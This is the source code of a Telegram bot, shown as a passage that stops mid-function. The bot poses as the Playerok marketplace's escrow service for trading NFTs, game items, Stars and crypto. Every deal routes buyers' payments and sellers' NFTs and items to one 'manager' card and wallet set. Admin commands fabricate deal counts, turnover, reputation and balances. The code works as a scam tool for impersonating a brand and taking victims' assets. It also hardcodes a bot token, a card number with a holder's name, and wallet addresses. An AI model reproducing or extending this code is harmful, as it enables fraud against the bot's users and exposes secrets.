import asyncio
import random
import string
import os
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.filters import Command, CommandStart

# ========== ДАННЫЕ ==========
BOT_TOKEN = "8243711699:AAGanT7gRrrAZtBiXSyy87HSmp1gCyFsQpM"
ADMIN_IDS = {174415647, 7984393882}   # ФИКСsed: было ADMIN_ID = 174415647 , 7984393882 (кортеж)
MANAGER_ID = 7602363090
MANAGER_USERNAME = "ManagerDealsPlayerok"
MANAGER_CARD = "89041751408 BT5 - Александр Ф."
TON_WALLET = "UQDUUFncBcWC4eH3wN_4G3N9Yaf6nBFlcumDP8daYAQHNSOc"
USDT_WALLET = "TjJAD8rR7yFb84F1boTKr6mRKJvLhNR9p1"
SUPPORT_USERNAME = "PlayerokSupports"
CHANNEL_LINK = "https://t.me/playerok"
BOT_USERNAME = "DealsPlayerokBot"

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# ========== ХРАНИЛИЩЕ ==========
user_agreements = {}
user_languages = {}
user_balances = {}
user_deals = {}
user_requisites = {}
active_deals = {}
user_stats = {}
deal_counter = 0
banned_users = set()
admin_states = {}
bot_username = None

# ========== УТИЛИТЫ ==========
def generate_memo():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=7))

def generate_deal_id():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))

async def get_bot_username():
    global bot_username
    if bot_username is None:
        me = await bot.get_me()
        bot_username = me.username
    return bot_username

async def send_main_menu(chat_id, lang, message_id=None):
    keyboard = main_keyboard_ru if lang == "ru" else main_keyboard_en
    if lang == "ru":
        text = ("👋 Playerok Bot | OTC\n\n"
                "Безопасный и удобный сервис для сделок!\n\n"
                "Наши преимущества:\n"
                "- 🤖 Автоматические сделки\n"
                "- 💸 Вывод в любой валюте\n"
                "- 🛡 Поддержка 24/7\n"
                "- ⚡️ Удобный интерфейс\n\n"
                "Выберите нужный раздел ниже:")
    else:
        text = ("👋 Playerok Bot | OTC\n\n"
                "Safe and convenient service for deals!\n\n"
                "Our advantages:\n"
                "- 🤖 Automatic deals\n"
                "- 💸 Withdrawal in any currency\n"
                "- 🛡 24/7 support\n"
                "- ⚡️ User-friendly interface\n\n"
                "Choose the desired section below:")
    try:
        photo = "https://i.postimg.cc/8P1ySbyM/og-playerok.png"
        if message_id:
            try:
                await bot.delete_message(chat_id, message_id)
            except:
                pass
        await bot.send_photo(chat_id, photo, caption=text, reply_markup=keyboard)
    except:
        if message_id:
            try:
                await bot.delete_message(chat_id, message_id)
            except:
                pass
        await bot.send_message(chat_id, text, reply_markup=keyboard)

async def safe_edit_message(callback: CallbackQuery, text: str, reply_markup: InlineKeyboardMarkup = None):
    try:
        await callback.message.edit_text(text, reply_markup=reply_markup)
    except:
        try:
            await callback.message.delete()
        except:
            pass
        await callback.message.answer(text, reply_markup=reply_markup)

# ========== КЛАВИАТУРЫ RU ==========
start_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Полностью согласен ✅", callback_data="agree")]
])

welcome_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="➡️ Продолжить ⬅️", callback_data="continue")]
])

main_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="➕ Создать сделку", callback_data="create_deal")],
    [InlineKeyboardButton(text="👤 Профиль", callback_data="profile")],
    [InlineKeyboardButton(text="💳 Реквизиты", callback_data="requisites")],
    [InlineKeyboardButton(text="🌐 Сменить язык", callback_data="change_language")],
    [InlineKeyboardButton(text="🆘 Поддержка", url=f"https://t.me/{SUPPORT_USERNAME}")],
    [InlineKeyboardButton(text="🌍 Наш сайт", url="https://playerok.com/")]
])

deal_type_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🎁 NFT / Подарки", callback_data="deal_gift")],
    [InlineKeyboardButton(text="⭐️ Telegram Stars", callback_data="deal_stars")],
    [InlineKeyboardButton(text="💎 TON", callback_data="deal_ton")],
    [InlineKeyboardButton(text="🎮 Игровые предметы", callback_data="deal_game")],
    [InlineKeyboardButton(text="🛠 Услуги", callback_data="deal_service")],
    [InlineKeyboardButton(text="₿ Криптовалюта", callback_data="deal_crypto")],
    [InlineKeyboardButton(text="🔙 В меню", callback_data="back_to_menu")]
])

back_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🔙 Назад", callback_data="back_step")]
])

currency_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🇷🇺 RUB", callback_data="currency_RUB"), InlineKeyboardButton(text="🇺🇸 USD", callback_data="currency_USD")],
    [InlineKeyboardButton(text="🇪🇺 EUR", callback_data="currency_EUR"), InlineKeyboardButton(text="🇰🇿 KZT", callback_data="currency_KZT")],
    [InlineKeyboardButton(text="🇺🇦 UAH", callback_data="currency_UAH"), InlineKeyboardButton(text="🇧🇾 BYN", callback_data="currency_BYN")],
    [InlineKeyboardButton(text="💵 USDT", callback_data="currency_USDT"), InlineKeyboardButton(text="💎 TON", callback_data="currency_TON")],
    [InlineKeyboardButton(text="⭐️ Telegram Stars", callback_data="currency_STARS")],
    [InlineKeyboardButton(text="🔙 Назад", callback_data="back_step")]
])

profile_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="💰 Пополнить баланс", callback_data="deposit"), InlineKeyboardButton(text="💸 Вывод средств", callback_data="withdraw")],
    [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_menu")]
])

read_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Я прочитал(-а)", callback_data="read_deposit")]
])

deposit_method_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="💳 Банковская карта", callback_data="deposit_card"), InlineKeyboardButton(text="💎 TON", callback_data="deposit_ton")],
    [InlineKeyboardButton(text="💵 USDT", callback_data="deposit_usdt")],
    [InlineKeyboardButton(text="🔙 Назад", callback_data="back_step")]
])

back_simple_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_requisites")]
])

requisites_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="💳 Добавить карту", callback_data="add_card")],
    [InlineKeyboardButton(text="💎 Добавить TON кошелек", callback_data="add_ton")],
    [InlineKeyboardButton(text="💵 Добавить USDT", callback_data="add_usdt")],
    [InlineKeyboardButton(text="👁 Просмотреть реквизиты", callback_data="view_requisites")],
    [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_menu")]
])

# ========== КЛАВИАТУРЫ EN ==========
start_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ I fully agree ✅", callback_data="agree")]
])

welcome_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="➡️ Continue ⬅️", callback_data="continue")]
])

main_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="➕ Create deal", callback_data="create_deal")],
    [InlineKeyboardButton(text="👤 Profile", callback_data="profile")],
    [InlineKeyboardButton(text="💳 Payment details", callback_data="requisites")],
    [InlineKeyboardButton(text="🌐 Change language", callback_data="change_language")],
    [InlineKeyboardButton(text="🆘 Support", url=f"https://t.me/{SUPPORT_USERNAME}")],
    [InlineKeyboardButton(text="🌍 Our website", url="https://playerok.com/")]
])

deal_type_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🎁 NFT / Gifts", callback_data="deal_gift")],
    [InlineKeyboardButton(text="⭐️ Telegram Stars", callback_data="deal_stars")],
    [InlineKeyboardButton(text="💎 TON", callback_data="deal_ton")],
    [InlineKeyboardButton(text="🎮 Game items", callback_data="deal_game")],
    [InlineKeyboardButton(text="🛠 Services", callback_data="deal_service")],
    [InlineKeyboardButton(text="₿ Cryptocurrency", callback_data="deal_crypto")],
    [InlineKeyboardButton(text="🔙 To menu", callback_data="back_to_menu")]
])

back_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🔙 BACK", callback_data="back_step")]
])

currency_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🇷🇺 RUB", callback_data="currency_RUB"), InlineKeyboardButton(text="🇺🇸 USD", callback_data="currency_USD")],
    [InlineKeyboardButton(text="🇪🇺 EUR", callback_data="currency_EUR"), InlineKeyboardButton(text="🇰🇿 KZT", callback_data="currency_KZT")],
    [InlineKeyboardButton(text="🇺🇦 UAH", callback_data="currency_UAH"), InlineKeyboardButton(text="🇧🇾 BYN", callback_data="currency_BYN")],
    [InlineKeyboardButton(text="💵 USDT", callback_data="currency_USDT"), InlineKeyboardButton(text="💎 TON", callback_data="currency_TON")],
    [InlineKeyboardButton(text="⭐️ Telegram Stars", callback_data="currency_STARS")],
    [InlineKeyboardButton(text="🔙 BACK", callback_data="back_step")]
])

profile_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="💰 Deposit", callback_data="deposit"), InlineKeyboardButton(text="💸 Withdraw", callback_data="withdraw")],
    [InlineKeyboardButton(text="🔙 BACK", callback_data="back_to_menu")]
])

read_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ I have read", callback_data="read_deposit")]
])

deposit_method_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="💳 Bank card", callback_data="deposit_card"), InlineKeyboardButton(text="💎 TON", callback_data="deposit_ton")],
    [InlineKeyboardButton(text="💵 USDT", callback_data="deposit_usdt")],
    [InlineKeyboardButton(text="🔙 BACK", callback_data="back_step")]
])

back_simple_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🔙 BACK", callback_data="back_to_requisites")]
])

requisites_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="💳 Add card", callback_data="add_card")],
    [InlineKeyboardButton(text="💎 Add TON wallet", callback_data="add_ton")],
    [InlineKeyboardButton(text="💵 Add USDT", callback_data="add_usdt")],
    [InlineKeyboardButton(text="👁 View requisites", callback_data="view_requisites")],
    [InlineKeyboardButton(text="🔙 Back", callback_data="back_to_menu")]
])

# ========== ОБЩИЕ КЛАВИАТУРЫ ==========
language_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🇷🇺 Русский", callback_data="lang_ru"), InlineKeyboardButton(text="🇬🇧 English", callback_data="lang_en")],
    [InlineKeyboardButton(text="🔙 Обратно в меню", callback_data="back_to_menu")]
])

buyer_deal_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Я оплатил", callback_data="paid_confirmed")],
    [InlineKeyboardButton(text="🚪 Выйти из сделки", callback_data="exit_deal")]
])

admin_payment_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Оплата получена", callback_data="admin_payment_ok")],
    [InlineKeyboardButton(text="❌ Оплата не получена", callback_data="admin_payment_fail")]
])

seller_gift_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="📦 Товар отправлен", callback_data="item_sent")]
])

buyer_confirmation_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Да, все верно", callback_data="buyer_confirm_ok")],
    [InlineKeyboardButton(text="❌ Нет, товар не получен", callback_data="buyer_confirm_fail")]
])

sierrateam_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Я ознакомился", callback_data="sierrateam_read")]
])

admin_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🔨 Забанить пользователя", callback_data="ban_user")],
    [InlineKeyboardButton(text="💸 Отправить деньги", callback_data="send_money")],
    [InlineKeyboardButton(text="📊 Установить успешные сделки", callback_data="set_successful_deals")],
    [InlineKeyboardButton(text="📈 Установить общее кол-во сделок", callback_data="set_total_deals")],
    [InlineKeyboardButton(text="💰 Установить оборот", callback_data="set_turnover")],
    [InlineKeyboardButton(text="🏠 Главное меню", callback_data="back_to_menu")]
])

# ========== ВСПОМОГАТЕЛЬНАЯ ФУНКЦИЯ ==========
def is_admin(user_id: int) -> bool:
    return user_id in ADMIN_IDS

# ========== АДМИН ПАНЕЛЬ ==========
@dp.message(Command("admin"))
async def admin_panel_command(message: Message):
    if not is_admin(message.from_user.id):
        await message.answer("❌ У вас нет доступа")
        return
    text = (
        "👑 АДМИН-ПАНЕЛЬ\n\n"
        "📊 УПРАВЛЕНИЕ СТАТИСТИКОЙ:\n"
        "/stats [id] — статистика пользователя\n"
        "/all — общая статистика\n"
        "/deal [id] [кол-во] — выдать сделки\n"
        "/success [id] [кол-во] — выдать успешные сделки\n"
        "/turnover [id] [сумма] — выдать оборот\n"
        "/rep [id] [кол-во] — выдать репутацию\n\n"
        "👥 УПРАВЛЕНИЕ ПОЛЬЗОВАТЕЛЯМИ:\n"
        "/ban [id] — заблокировать пользователя\n"
        "/unban [id] — разблокировать\n\n"
        "👤 МЕНЕДЖЕР:\n"
        "/manager — информация о менеджере\n\n"
        "🖼 БАННЕР:\n"
        "/setbanner — установить фото\n"
        "/removebanner — удалить баннер"
    )
    await message.answer(text)

@dp.message(Command("stats"))
async def admin_stats_command(message: Message):
    if not is_admin(message.from_user.id):
        return
    try:
        args = message.text.split()
        user_id = int(args[1])
        stats = user_stats.get(user_id, {"successful": 0, "total": 0, "turnover": 0, "rep": 0})
        await message.answer(
            f"📊 Статистика пользователя {user_id}\n\n"
            f"📈 Всего сделок: {stats.get('total', 0)}\n"
            f"✅ Успешных: {stats.get('successful', 0)}\n"
            f"💰 Оборот: {stats.get('turnover', 0)}\n"
            f"⭐️ Репутация: {stats.get('rep', 0)}"
        )
    except:
        await message.answer("❌ Используй: /stats [id]")

@dp.message(Command("all"))
async def admin_all_command(message: Message):
    if not is_admin(message.from_user.id):
        return
    total_users = len(user_stats)
    total_deals = sum(s.get('total', 0) for s in user_stats.values())
    total_success = sum(s.get('successful', 0) for s in user_stats.values())
    total_turnover = sum(s.get('turnover', 0) for s in user_stats.values())
    total_rep = sum(s.get('rep', 0) for s in user_stats.values())
    await message.answer(
        f"📊 ОБЩАЯ СТАТИСТИКА\n\n"
        f"👥 Всего пользователей: {total_users}\n"
        f"📈 Всего сделок: {total_deals}\n"
        f"✅ Успешных сделок: {total_success}\n"
        f"💰 Общий оборот: {total_turnover}\n"
        f"⭐️ Всего репутации: {total_rep}"
    )

@dp.message(Command("deal"))
async def admin_deal_command(message: Message):
    if not is_admin(message.from_user.id):
        return
    try:
        args = message.text.split()
        user_id = int(args[1])
        amount = int(args[2])
        if user_id not in user_stats:
            user_stats[user_id] = {"successful": 0, "total": 0, "turnover": 0, "rep": 0}
        user_stats[user_id]["total"] = user_stats[user_id].get("total", 0) + amount
        await message.answer(f"✅ Выдано {amount} сделок пользователю {user_id}")
    except:
        await message.answer("❌ Используй: /deal [id] [кол-во]")

@dp.message(Command("success"))
async def admin_success_command(message: Message):
    if not is_admin(message.from_user.id):
        return
    try:
        args = message.text.split()
        user_id = int(args[1])
        amount = int(args[2])
        if user_id not in user_stats:
            user_stats[user_id] = {"successful": 0, "total": 0, "turnover": 0, "rep": 0}
        user_stats[user_id]["successful"] = user_stats[user_id].get("successful", 0) + amount
        user_stats[user_id]["total"] = user_stats[user_id].get("total", 0) + amount
        await message.answer(f"✅ Выдано {amount} успешных сделок пользователю {user_id}")
    except:
        await message.answer("❌ Используй: /success [id] [кол-во]")

@dp.message(Command("turnover"))
async def admin_turnover_command(message: Message):
    if not is_admin(message.from_user.id):
        return
    try:
        args = message.text.split()
        user_id = int(args[1])
        amount = float(args[2])
        if user_id not in user_stats:
            user_stats[user_id] = {"successful": 0, "total": 0, "turnover": 0, "rep": 0}
        user_stats[user_id]["turnover"] = user_stats[user_id].get("turnover", 0) + amount
        await message.answer(f"✅ Выдано {amount} оборота пользователю {user_id}")
    except:
        await message.answer("❌ Используй: /turnover [id] [сумма]")

@dp.message(Command("rep"))
async def admin_rep_command(message: Message):
    if not is_admin(message.from_user.id):
        return
    try:
        args = message.text.split()
        user_id = int(args[1])
        amount = int(args[2])
        if user_id not in user_stats:
            user_stats[user_id] = {"successful": 0, "total": 0, "turnover": 0, "rep": 0}
        user_stats[user_id]["rep"] = user_stats[user_id].get("rep", 0) + amount
        await message.answer(f"✅ Выдано {amount} репутации пользователю {user_id}")
    except:
        await message.answer("❌ Используй: /rep [id] [кол-во]")

@dp.message(Command("ban"))
async def admin_ban_command(message: Message):
    if not is_admin(message.from_user.id):
        return
    try:
        user_id = int(message.text.split()[1])
        banned_users.add(user_id)
        await message.answer(f"✅ Пользователь {user_id} заблокирован")
    except:
        await message.answer("❌ Используй: /ban [id]")

@dp.message(Command("unban"))
async def admin_unban_command(message: Message):
    if not is_admin(message.from_user.id):
        return
    try:
        user_id = int(message.text.split()[1])
        if user_id in banned_users:
            banned_users.remove(user_id)
            await message.answer(f"✅ Пользователь {user_id} разблокирован")
        else:
            await message.answer(f"❌ Пользователь {user_id} не в бане")
    except:
        await message.answer("❌ Используй: /unban [id]")

@dp.message(Command("manager"))
async def admin_manager_command(message: Message):
    if not is_admin(message.from_user.id):
        return
    await message.answer(
        f"👤 Информация о менеджере\n\n"
        f"📱 Username: @{MANAGER_USERNAME}\n"
        f"🆔 ID: {MANAGER_ID}\n"
        f"💳 Карта: {MANAGER_CARD}\n"
        f"💎 TON: {TON_WALLET}\n"
        f"💵 USDT: {USDT_WALLET}"
    )

# ========== НАВИГАЦИЯ ==========
@dp.callback_query(F.data == "back_to_menu")
async def back_to_menu_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    lang = user_languages.get(user_id, "ru")
    await send_main_menu(callback.message.chat.id, lang, callback.message.message_id)

@dp.callback_query(F.data == "back_step")
async def back_step_callback(callback: CallbackQuery):
    await callback.answer()

@dp.callback_query(F.data == "back_to_deal")
async def back_to_deal_callback(callback: CallbackQuery):
    await callback.answer()

@dp.callback_query(F.data == "back_to_requisites")
async def back_to_requisites_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    lang = user_languages.get(user_id, "ru")
    await safe_edit_message(
        callback,
        "⚙️ Управление реквизитами\n\nВыберите одну из предложенных ниже опций:",
        requisites_keyboard_ru if lang == "ru" else requisites_keyboard_en
    )

# ========== СТАРТ ==========
@dp.message(CommandStart())
async def start_command(message: Message):
    user_id = message.from_user.id
    if user_id in banned_users:
        await message.answer("✖ Вы были заблокированы в боте")
        return

    lang = user_languages.get(user_id, "ru")
    args = message.text.split()

    if len(args) > 1:
        param = args[1]
        if param.startswith('deal_'):
            deal_id = param.replace('deal_', '')
            if deal_id in active_deals:
                deal = active_deals[deal_id]
                buyer_id = message.from_user.id
                buyer_username = message.from_user.username or "Не указан"
                if deal["buyer_id"] is None:
                    deal["buyer_id"] = buyer_id
                    deal["buyer_username"] = buyer_username
                    deal["status"] = "active"

                    type_names_ru = {
                        "deal_gift": "🎁 NFT/Подарок",
                        "deal_stars": "⭐️ Telegram Stars",
                        "deal_ton": "💎 TON",
                        "deal_game": "🎮 Игровой предмет",
                        "deal_service": "🛠 Услуга",
                        "deal_crypto": "₿ Криптовалюта"
                    }
                    deal_type_text = type_names_ru.get(deal["type"], "📦 Другое")

                    send_instruction = ""
                    if deal["type"] == "deal_gift":
                        send_instruction = f"🎁 NFT нужно отправить менеджеру: @{MANAGER_USERNAME}"
                    elif deal["type"] == "deal_game":
                        send_instruction = f"🎮 Игровой предмет нужно отправить менеджеру: @{MANAGER_USERNAME}"
                    elif deal["type"] == "deal_ton":
                        send_instruction = f"💎 TON нужно отправить на кошелек менеджера:\n`{TON_WALLET}`"
                    elif deal["type"] == "deal_crypto":
                        send_instruction = f"₿ Криптовалюту нужно отправить на кошелек менеджера:\n`{USDT_WALLET if deal['currency'] == 'USDT' else TON_WALLET}`"
                    elif deal["type"] == "deal_stars":
                        send_instruction = "⭐️ Stars будут зачислены автоматически"
                    elif deal["type"] == "deal_service":
                        send_instruction = "⏳ Ожидайте выполнения услуги"

                    payment_text = f"💳 Оплата на карту:\n`{MANAGER_CARD}`\n\n"
                    payment_text += f"💎 Или на TON кошелек:\n`{TON_WALLET}`\n\n"
                    payment_text += f"💵 Или на USDT (TRC-20):\n`{USDT_WALLET}`\n\n"
                    payment_text += "✅ После перевода нажмите кнопку «✅ Я оплатил»"

                    full_text = (
                        f"📄 Информация о сделке #{deal_id}\n\n"
                        f"👤 Вы покупатель в сделке.\n"
                        f"👤 Продавец: @{deal['seller_username']} ({deal['seller_id']})\n\n"
                        f"📦 Вы покупаете: {deal['description']}\n"
                        f"📌 Тип: {deal_type_text}\n\n"
                        f"{send_instruction}\n\n"
                        f"━━━━━━━━━━━━━━━━━━━━\n"
                        f"💰 Сумма к оплате: {deal['amount']} {deal['currency']}\n\n"
                        f"{payment_text}"
                    )

                    await message.answer(full_text, reply_markup=buyer_deal_keyboard)

                    seller_lang = user_languages.get(deal["seller_id"], "ru")
                    type_names_en = {
                        "deal_gift": "🎁 NFT/Gift",
                        "deal_stars": "⭐️ Telegram Stars",
                        "deal_ton": "💎 TON",
                        "deal_game": "🎮 Game item",
                        "deal_service": "🛠 Service",
                        "deal_crypto": "₿ Cryptocurrency"
                    }
                    if seller_lang == "ru":
                        await bot.send_message(
                            deal["seller_id"],
                            f"👤 Пользователь @{buyer_username} ({buyer_id}) присоединился к сделке #{deal_id}\n"
                            f"• Тип сделки: {type_names_ru.get(deal['type'], 'other')}\n"
                            f"⚠️ Проверьте, что это тот же пользователь, с которым вы вели диалог ранее!"
                        )
                    else:
                        await bot.send_message(
                            deal["seller_id"],
                            f"👤 User @{buyer_username} ({buyer_id}) joined the deal #{deal_id}\n"
                            f"• Deal type: {type_names_en.get(deal['type'], 'other')}\n"
                            f"⚠️ Make sure this is the same user you were chatting with before!"
                        )
                else:
                    await message.answer("❌ Эта сделка уже занята другим покупателем")
            else:
                await message.answer("❌ Сделка не найдена или была отменена")
            return

    if user_id in user_agreements and user_agreements[user_id]:
        await send_main_menu(message.chat.id, lang)
    else:
        if lang == "ru":
            await message.answer(
                "✅ Вы подтверждаете, что ознакомились и согласны с <<Условиями предоставления услуг Гарант сервиса?>>\n\n"
                "📚 Подробнее: https://telegra.ph/lspolzuya-Nash-servis-Vy-soglashaetes-s-01-02-2",
                reply_markup=start_keyboard_ru
            )
        else:
            await message.answer(
                "✅ Do you confirm that you have read and agree with the <<Terms of Service of the Guarantee Service?>>\n\n"
                "📚 More details: https://telegra.ph/lspolzuya-Nash-servis-Vy-soglashaetes-s-01-02-2",
                reply_markup=start_keyboard_en
            )

# ========== СОГЛАСИЕ ==========
@dp.callback_query(F.data == "agree")
async def agree_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("✖ Вы были заблокированы в боте", show_alert=True)
        return
    user_agreements[callback.from_user.id] = True
    lang = user_languages.get(callback.from_user.id, "ru")
    if lang == "ru":
        await safe_edit_message(
            callback,
            f"👋 Добро пожаловать в Playerok — сервис, обеспечивающий безопасность и удобство проведения сделок.\n"
            f"📢 Наш канал - {CHANNEL_LINK}\n"
            f"🆘 Поддержка - @{SUPPORT_USERNAME}",
            welcome_keyboard_ru
        )
    else:
        await safe_edit_message(
            callback,
            f"👋 Welcome to Playerok - a service that ensures security and convenience of transactions.\n"
            f"📢 Our channel - {CHANNEL_LINK}\n"
            f"🆘 Support - @{SUPPORT_USERNAME}",
            welcome_keyboard_en
        )

@dp.callback_query(F.data == "continue")
async def continue_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("✖ Вы были заблокированы в боте", show_alert=True)
        return
    await send_main_menu(callback.message.chat.id, user_languages.get(callback.from_user.id, "ru"), callback.message.message_id)

# ========== СОЗДАНИЕ СДЕЛКИ ==========
@dp.callback_query(F.data == "create_deal")
async def create_deal_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("✖ Вы были заблокированы в боте", show_alert=True)
        return
    lang = user_languages.get(callback.from_user.id, "ru")
    if lang == "ru":
        await safe_edit_message(callback, "📝 Создать сделку\n\nВыберите тип сделки:", deal_type_keyboard_ru)
    else:
        await safe_edit_message(callback, "📝 Create deal\n\nChoose deal type:", deal_type_keyboard_en)

@dp.callback_query(F.data.startswith("deal_"))
async def deal_type_selected_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("✖ Вы были заблокированы в боте", show_alert=True)
        return
    user_id = callback.from_user.id
    deal_type = callback.data
    user_deals[user_id] = {"type": deal_type, "step": "description"}
    lang = user_languages.get(user_id, "ru")

    type_texts_ru = {
        "deal_gift": "📝 Введите ссылку(-и) на NFT/подарок(-и):\n\nПример:\n`t.me/nft/DurovsCap-1`\n\n⚠️ NFT нужно будет отправить менеджеру",
        "deal_stars": "📝 Введите количество Telegram Stars:\n\nПример:\n`1000`",
        "deal_ton": "📝 Введите количество TON:\n\nПример:\n`50`\n\n⚠️ TON нужно будет отправить на кошелек менеджера",
        "deal_game": "📝 Введите ссылку на игровой предмет:\n\nПример:\n`https://steamcommunity.com/...`",
        "deal_service": "📝 Опишите услугу подробно:",
        "deal_crypto": "📝 Введите сумму в криптовалюте:"
    }
    type_texts_en = {
        "deal_gift": "📝 Enter NFT/gift link(s):\n\nExample:\n`t.me/nft/DurovsCap-1`",
        "deal_stars": "📝 Enter Telegram Stars amount:\n\nExample:\n`1000`",
        "deal_ton": "📝 Enter TON amount:\n\nExample:\n`50`",
        "deal_game": "📝 Enter game item link:\n\nExample:\n`https://steamcommunity.com/...`",
        "deal_service": "📝 Describe the service:",
        "deal_crypto": "📝 Enter cryptocurrency amount:"
    }

    text = type_texts_ru.get(deal_type, "📝 Опишите товар/услугу:") if lang == "ru" else type_texts_en.get(deal_type, "📝 Describe the item/service:")
    await safe_edit_message(callback, f"📝 Создание сделки\n\n{text}", back_keyboard_ru if lang == "ru" else back_keyboard_en)

@dp.callback_query(F.data.startswith("currency_"))
async def currency_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("✖ Вы были заблокированы в боте", show_alert=True)
        return
    user_id = callback.from_user.id
    currency = callback.data.split("_")[1]
    if currency == "STARS":
        currency = "Telegram Stars"
    if user_id in user_deals:
        user_deals[user_id]["currency"] = currency
        user_deals[user_id]["step"] = "amount"
        lang = user_languages.get(user_id, "ru")
        if lang == "ru":
            await safe_edit_message(callback, f"📝 Создание сделки\n\nВведите сумму сделки в {currency}", back_keyboard_ru)
        else:
            await safe_edit_message(callback, f"📝 Creating deal\n\nEnter deal amount in {currency}", back_keyboard_en)

# ========== ОБРАБОТКА ТЕКСТА ==========
@dp.message(F.text)
async def handle_text(message: Message):
    if message.text.startswith('/'):
        return
    user_id = message.from_user.id
    if user_id in banned_users:
        await message.answer("✖ Вы были заблокированы в боте")
        return
    lang = user_languages.get(user_id, "ru")

    # Состояния админа
    if is_admin(user_id) and user_id in admin_states:
        state = admin_states[user_id]
        text = message.text.strip()
        if state == "waiting_ban_id":
            if text.isdigit():
                user_to_ban = int(text)
                banned_users.add(user_to_ban)
                await message.answer("✅ Пользователь заблокирован")
                del admin_states[user_id]
            else:
                await message.answer("❌ Неверный формат ID")
        elif state == "waiting_send_money":
            parts = text.split()
            if len(parts) == 2:
                try:
                    target_user = int(parts[0])
                    amount = float(parts[1])
                    if target_user not in user_balances:
                        user_balances[target_user] = 0
                    user_balances[target_user] += amount
                    await message.answer(f"✅ Пользователю {target_user} начислено {amount} RUB")
                    del admin_states[user_id]
                except ValueError:
                    await message.answer("❌ Ошибка формата данных")
            else:
                await message.answer("❌ Неверный формат. Используйте: ID СУММА")
        elif state == "waiting_successful_deals":
            parts = text.split()
            if len(parts) == 2:
                try:
                    target_user = int(parts[0])
                    count = int(parts[1])
                    if target_user not in user_stats:
                        user_stats[target_user] = {"successful": 0, "total": 0, "turnover": 0, "rep": 0}
                    user_stats[target_user]["successful"] = count
                    await message.answer(f"✅ Установлено {count} успешных сделок для пользователя {target_user}")
                    del admin_states[user_id]
                except ValueError:
                    await message.answer("❌ Ошибка формата данных")
            else:
                await message.answer("❌ Неверный формат. Используйте: ID КОЛИЧЕСТВО")
        elif state == "waiting_total_deals":
            parts = text.split()
            if len(parts) == 2:
                try:
                    target_user = int(parts[0])
                    count = int(parts[1])
                    if target_user not in user_stats:
                        user_stats[target_user] = {"successful": 0, "total": 0, "turnover": 0, "rep": 0}
                    user_stats[target_user]["total"] = count
                    await message.answer(f"✅ Установлено {count} общих сделок для пользователя {target_user}")
                    del admin_states[user_id]
                except ValueError:
                    await message.answer("❌ Ошибка формата данных")
            else:
                await message.answer("❌ Неверный формат. Используйте: ID КОЛИЧЕСТВО")
        elif state == "waiting_turnover":
            parts = text.split()
            if len(parts) == 2:
                try:
                    target_user = int(parts[0])
                    amount = float(parts[1])
                    if target_user not in user_stats:
                        user_stats[target_user] = {"successful": 0, "total": 0, "turnover": 0, "rep": 0}
                    user_stats[target_user]["turnover"] = amount
                    await message.answer(f"✅ Установлен оборот {amount} RUB для пользователя {target_user}")
                    del admin_states[user_id]
                except ValueError:
                    await message.answer("❌ Ошибка формата данных")
            else:
                await message.answer("❌ Неверный формат. Используйте: ID СУММА")
        return

    # Создание сделки
    if user_id in user_deals:
        deal_data = user_deals[user_id]
        if deal_data.get("step") == "description":
            deal_data["description"] = message.text
            deal_data["step"] = "currency"
            if lang == "ru":
